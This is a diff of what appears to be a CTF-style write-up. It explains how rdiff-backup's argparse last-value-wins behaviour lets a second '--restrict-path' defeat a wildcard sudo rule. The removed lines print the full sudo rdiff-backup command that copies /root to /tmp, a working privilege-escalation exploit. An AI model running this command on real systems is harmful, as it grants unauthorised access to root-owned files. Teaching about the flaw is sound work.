@@ -237,12 +237,12 @@ so rdiff-backup has two modes:
 
 **server mode** - spawned on the "remote" side, reads/writes files
 
-```
---restrict-path DIR_PATH    restrict remote access to given path
---restrict-mode             read-write / read-only / update-only
+```bash
+--restrict-path DIR_PATH  # restrict remote access to given path
+--restrict-mode            #read-write / read-only / update-only
 ```
 
-**client mode** — the side you interact with, tells the server what to do. uses `--remote-schema` to define how to spawn the server, and `%s` as a placeholder for the source path.
+**client mode** -  the side you interact with, tells the server what to do. uses `--remote-schema` to define how to spawn the server, and `%s` as a placeholder for the source path.
 
 the `[[USER@]SERVER::]PATH` syntax:
 
@@ -253,28 +253,24 @@ the `[[USER@]SERVER::]PATH` syntax:
 └── empty hostname = localhost
 ```
 
-no SSH needed — `::` with no hostname spawns the server locally.
+no SSH needed -  `::` with no hostname spawns the server locally.
 
 ---
-
 #### the vulnerability
 
 **argparse last-value-wins.**
 
 `--restrict-path` only accepts one value. when you pass it twice, argparse silently takes the last one and discards the first.
 
-the sudo rule hardcodes `--restrict-path /opt/backup` — but the `*` wildcard lets owen inject a second `--restrict-path` which **overwrites** the first.
+the sudo rule hardcodes `--restrict-path /opt/backup` -  but the `*` wildcard lets owen inject a second `--restrict-path` which **overwrites** the first.
 
 ---
-
 #### the exploit
 
 bash
 
 ```bash
-rdiff-backup --remote-schema \
-  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
-  backup /::/root /tmp/rootbak
+****
 ```
 
 what actually runs as root:
